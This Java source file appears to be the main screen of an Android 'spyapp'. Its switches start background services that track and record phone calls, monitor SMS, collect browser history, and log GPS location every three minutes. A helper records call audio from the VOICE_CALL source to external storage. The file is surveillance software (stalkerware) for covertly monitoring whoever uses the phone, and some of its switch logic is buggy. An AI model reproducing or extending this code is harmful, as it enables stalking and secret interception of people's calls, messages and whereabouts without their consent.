package com.example.spyapp;
import java.io.File;
import java.io.IOException;

import com.example.spyapp.call_tracking.RecordService;
import com.example.spyapp.receiver.GpsTrackerAlarmReceiver;
import com.example.spyapp.util.Const;
import com.example.spyapp.util.Constants;
import com.example.spyapp.util.Prefs;
import com.xiledsystems.AlternateJavaBridgelib.components.altbridge.FormService;
import com.xiledsystems.AlternateJavaBridgelib.components.altbridge.util.NetworkUtil;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.os.Environment;
import android.os.SystemClock;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.CompoundButton;
import android.widget.CompoundButton.OnCheckedChangeListener;
import android.widget.RelativeLayout;
import android.widget.Switch;
import android.widget.Toast;

public class MainActivity extends Activity {

	boolean callBtnClick=true;
	boolean smsBtnClick=true;
	boolean webBtnClick=true;
	boolean GPSBtnClick=true;
	
	private Prefs sharedpreferences;
	private AlarmManager alarmManager;
	
	
	private Intent gpsTrackerIntent;
	private PendingIntent pendingIntent;
	 
	Services mService;
	LocationManager locationManager;
	boolean isNetworkAvaiable;
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.dash_board);
		sharedpreferences=new Prefs(getApplicationContext());
		
		isNetworkAvaiable=NetworkUtil.isConnected(getApplicationContext());
		if(isNetworkAvaiable){
		String location_context = Context.LOCATION_SERVICE;
		locationManager = (LocationManager) getSystemService(location_context);	
		}
		
		setLayoutHandlers();
		
		
		
		
		
	}
	
	private void setLayoutHandlers() {
		((RelativeLayout) findViewById(R.id.call_layout)).setOnClickListener(btnClick);
		((RelativeLayout) findViewById(R.id.sms_layout)).setOnClickListener(btnClick);
		((RelativeLayout) findViewById(R.id.browser_layout)).setOnClickListener(btnClick);
		((RelativeLayout) findViewById(R.id.gps_layout)).setOnClickListener(btnClick);
			
		
		((Switch) findViewById(R.id.call_switch)).setOnCheckedChangeListener(new OnCheckedChangeListener() { 
		   @Override
		   public void onCheckedChanged(CompoundButton buttonView,boolean isChecked) {
			   isNetworkAvaiable=NetworkUtil.isConnected(getApplicationContext());
		    if(isChecked){
		    	if(isNetworkAvaiable){
		    	setSharedPreferences(false);
		    	 getApplicationContext().startService(new Intent(MainActivity.this, Services.class));
		    	 enableSwitchButtons(true,R.id.call_switch,Const.callSwitchPref);
		    	}else{
		    		Toast.makeText(getApplicationContext(), "No Internet Connection", Toast.LENGTH_SHORT).show();;
		    	}
		    }else{
		    	getApplicationContext().stopService(new Intent(MainActivity.this, Services.class));
		    	enableSwitchButtons(false,R.id.call_switch,Const.callSwitchPref);
		    	setSharedPreferences(true);
		    }
		 
		   }
		  });
		
		
		((Switch) findViewById(R.id.message_switch)).setOnCheckedChangeListener(new OnCheckedChangeListener() { 
			   @Override
			   public void onCheckedChanged(CompoundButton buttonView,boolean isChecked) {
			 
				   Intent myIntent = new Intent(MainActivity.this,
							Services.class);
				   isNetworkAvaiable=NetworkUtil.isConnected(getApplicationContext());
			    if(isChecked){
			    	if(isNetworkAvaiable){
					startService(myIntent);
			    	enableSwitchButtons(true,R.id.message_switch,Const.smsSwitchPref);
			    	}else{
			    		Toast.makeText(getApplicationContext(), "No Internet Connection", Toast.LENGTH_SHORT).show();;
			    	}
			    }else{
			    	stopService(myIntent);
			    	enableSwitchButtons(false,R.id.message_switch,Const.smsSwitchPref);
			    }
			 
			   }
		  });
		
		
		((Switch) findViewById(R.id.browser_switch)).setOnCheckedChangeListener(new OnCheckedChangeListener() { 
			   @Override
			   public void onCheckedChanged(CompoundButton buttonView,boolean isChecked) {
				   isNetworkAvaiable=NetworkUtil.isConnected(getApplicationContext());
				   Intent myIntent = new Intent(MainActivity.this,
							Services.class);
			    if(isChecked){
			    	if(isNetworkAvaiable){
			    	enableSwitchButtons(true,R.id.browser_switch,Const.webSwitchHistPref);
			    	startService(myIntent);
			    	}else{
			    		Toast.makeText(getApplicationContext(), "No Internet Connection", Toast.LENGTH_SHORT).show();;
			    	}
			    }else{
			    	startService(myIntent);
			    	enableSwitchButtons(false,R.id.browser_switch,Const.webSwitchHistPref);
			    }
			 
			   }
		  });
		
		((Switch) findViewById(R.id.gps_switch)).setOnCheckedChangeListener(new OnCheckedChangeListener() { 
			   @Override
			   public void onCheckedChanged(CompoundButton buttonView,boolean isChecked) {
				   isNetworkAvaiable=NetworkUtil.isConnected(getApplicationContext());
			    if(isChecked){
			    	
		            if(isNetworkAvaiable){
		            	boolean isGPSEnabled = locationManager
			                    .isProviderEnabled(LocationManager.GPS_PROVIDER);
			 
			            // getting network status
			            boolean isNetworkEnabled = locationManager
			                    .isProviderEnabled(LocationManager.NETWORK_PROVIDER);
		            	if(isGPSEnabled && isNetworkEnabled){
							GPSBtnClick=false;
							startAlarmManager();
							enableSwitchButtons(true,R.id.gps_switch,Const.gpsSwitchHistPref);						
						}else{
							Toast.makeText(getApplicationContext(), "Please Enable GPS Location", Toast.LENGTH_SHORT).show();;
						}
		            }else{
		            	cancelAlarmManager();
						Toast.makeText(getApplicationContext(), "No Internet Connection", Toast.LENGTH_SHORT).show();
					}
			    	
			    	
			    	
			    }else{
			    	enableSwitchButtons(false,R.id.gps_switch,Const.gpsSwitchHistPref);
			    }
			 
			   }
		  });
		
		boolean call=sharedpreferences.GetBoolean(Const.callSwitchPref);
		boolean sms=sharedpreferences.GetBoolean(Const.smsSwitchPref, false);
		boolean web=sharedpreferences.GetBoolean(Const.webSwitchHistPref, false);
		boolean gps=sharedpreferences.GetBoolean(Const.webSwitchHistPref, false);
		
		enableSwitchButtons(call,R.id.call_switch,Const.callSwitchPref);
		enableSwitchButtons(sms,R.id.message_switch,Const.smsSwitchPref);
		enableSwitchButtons(web,R.id.browser_switch,Const.webSwitchHistPref);
		enableSwitchButtons(gps,R.id.gps_switch,Const.gpsSwitchHistPref);
		
		
		
		
	}
	
	private void setSharedPreferences(boolean silentMode) {
		SharedPreferences settings = this.getSharedPreferences(
				Constants.LISTEN_ENABLED, 0);
		SharedPreferences.Editor editor = settings.edit();
		editor.putBoolean("silentMode", silentMode);
		editor.commit();

		Intent myIntent = new Intent(getApplicationContext(), RecordService.class);
		myIntent.putExtra("commandType",
				silentMode ? Constants.RECORDING_DISABLED
						: Constants.RECORDING_ENABLED);
		myIntent.putExtra("silentMode", silentMode);
		this.startService(myIntent);
	}
	public static int updateExternalStorageState() {
		String state = Environment.getExternalStorageState();
		if (Environment.MEDIA_MOUNTED.equals(state)) {
			return Const.MEDIA_MOUNTED;
		} else if (Environment.MEDIA_MOUNTED_READ_ONLY.equals(state)) {
			return Const.MEDIA_MOUNTED_READ_ONLY;
		} else {
			return Const.NO_MEDIA;
		}
	}
	
	private View.OnClickListener btnClick = new View.OnClickListener() {
		@Override
		public void onClick(View v) {
			switch (v.getId()) {
			case R.id.call_layout: {
				Intent intent=new Intent(MainActivity.this, CallSettingScreen.class);
				startActivity(intent);
				intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
				overridePendingTransition(R.anim.slide_in_from_left, R.anim.slide_out_to_right);
				break;
			}
			case R.id.sms_layout: {
				Intent myIntent = new Intent(MainActivity.this,
						Services.class);
				if(smsBtnClick){
					isNetworkAvaiable=NetworkUtil.isConnected(getApplicationContext());
					if(isNetworkAvaiable){
						smsBtnClick=false;
						startService(myIntent);
						enableSwitchButtons(true,R.id.message_switch,Const.smsSwitchPref);
					}else{
						stopService(myIntent);
						Toast.makeText(getApplicationContext(), "No Internet Connection", Toast.LENGTH_SHORT).show();;
					}
					
				}else{
					smsBtnClick=true;
					enableSwitchButtons(false,R.id.message_switch,Const.smsSwitchPref);
				}
				
				break;
			}
			case R.id.browser_layout: {
				
				if(webBtnClick){
					
					Intent myIntent = new Intent(MainActivity.this,
							Services.class);
						isNetworkAvaiable=NetworkUtil.isConnected(getApplicationContext());
						if(isNetworkAvaiable){
							webBtnClick=false;
							startService(myIntent);
							enableSwitchButtons(true,R.id.browser_switch,Const.webSwitchHistPref);
						}else{
							stopService(myIntent);
							Toast.makeText(getApplicationContext(), "No Internet Connection", Toast.LENGTH_SHORT).show();;
						}
						
					
					
					
					
					
				}else{
					webBtnClick=true;
					enableSwitchButtons(false,R.id.browser_switch,Const.webSwitchHistPref);
				}
				break;
			}
			
			case R.id.gps_layout: {
				boolean isGPSEnabled = locationManager
		                    .isProviderEnabled(LocationManager.GPS_PROVIDER);
		 
		            // getting network status
		            boolean isNetworkEnabled = locationManager
		                    .isProviderEnabled(LocationManager.NETWORK_PROVIDER);
		            isNetworkAvaiable=NetworkUtil.isConnected(getApplicationContext());
				if(GPSBtnClick){
					if(isNetworkAvaiable){
					if(isGPSEnabled && isNetworkEnabled){
						GPSBtnClick=false;
						enableSwitchButtons(true,R.id.gps_switch,Const.gpsSwitchHistPref);
						startAlarmManager();						
					}else{
						Toast.makeText(getApplicationContext(), "Please Enable GPS Location", Toast.LENGTH_SHORT).show();;
					}
					}else{
						Toast.makeText(getApplicationContext(), "No Internet Connection", Toast.LENGTH_SHORT).show();;
					}

				}else{
					GPSBtnClick=true;
					enableSwitchButtons(false,R.id.gps_switch,Const.gpsSwitchHistPref);
					cancelAlarmManager();
				}
				break;
			}
			
			}
		}
	};
	
	protected void onPause()
	{
	    super.onPause();
	    System.gc();
	}
	
	public void shutdownClicked() {
		int pid = android.os.Process.myPid();
        android.os.Process.killProcess(pid);
        System.exit(0);
        finish();
	}
	
	private void enableSwitchButtons(boolean isRecording,int id,String key) {
		((Switch) findViewById(id)).setChecked(isRecording);
		sharedpreferences.StoreBoolean(key, isRecording);
	}
	
	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

	@Override
	public boolean onOptionsItemSelected(MenuItem item) {
		// Handle action bar item clicks here. The action bar will
		// automatically handle clicks on the Home/Up button, so long
		// as you specify a parent activity in AndroidManifest.xml.
		int id = item.getItemId();
		if (id == R.id.shutdown) {
			shutdownClicked();
			return true;
		}
		return super.onOptionsItemSelected(item);
	}
	
	  private void cancelAlarmManager() {
	        Context context = getBaseContext();
	        Intent gpsTrackerIntent = new Intent(context, GpsTrackerAlarmReceiver.class);
	        PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, gpsTrackerIntent, 0);
	        AlarmManager alarmManager = (AlarmManager)context.getSystemService(Context.ALARM_SERVICE);
	        alarmManager.cancel(pendingIntent);
	  }
	  
	  private void startAlarmManager() {
	        Context context = getBaseContext();
	        alarmManager = (AlarmManager)context.getSystemService(Context.ALARM_SERVICE);
	        gpsTrackerIntent = new Intent(context, GpsTrackerAlarmReceiver.class);
	        pendingIntent = PendingIntent.getBroadcast(context, 0, gpsTrackerIntent, 0);

	        alarmManager.setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP,
	                SystemClock.elapsedRealtime(),
	                3*60000, // 60000 = 1 minute
	                pendingIntent);
	    }
	  
	  public static  MediaRecorder recorder = null;
	  public static void startRecording() {
			recorder = new MediaRecorder();

//			recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
//			recorder.setOutputFormat(output_formats[currentFormat]);
//			recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
			
			recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
			recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
			recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
			recorder.setOutputFile(getFilename());

			recorder.setOnErrorListener(errorListener);
			recorder.setOnInfoListener(infoListener);

			try {
				recorder.prepare();
				recorder.start();
			} catch (IllegalStateException e) {
				e.printStackTrace();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}

		public static MediaRecorder stopRecording() {
			if (null != recorder) {
				recorder.stop();
				recorder.reset();
				recorder.release();

				recorder = null;
			}
			return recorder;
		}
		
		private static String getFilename() {
			String filepath = Environment.getExternalStorageDirectory().getPath();
			File file = new File(filepath, "AudioRecorder");

			if (!file.exists()) {
				file.mkdirs();
			}

			return (file.getAbsolutePath() + "/" + System.currentTimeMillis() + ".mp4");
		}
		
		public static MediaRecorder.OnErrorListener errorListener = new MediaRecorder.OnErrorListener() {
			@Override
			public void onError(MediaRecorder mr, int what, int extra) {
				System.out.println("errorListener");
			}
		};

		public static  MediaRecorder.OnInfoListener infoListener = new MediaRecorder.OnInfoListener() {
			@Override
			public void onInfo(MediaRecorder mr, int what, int extra) {
				System.out.println("infoListener");
			}
		};
		
		

}
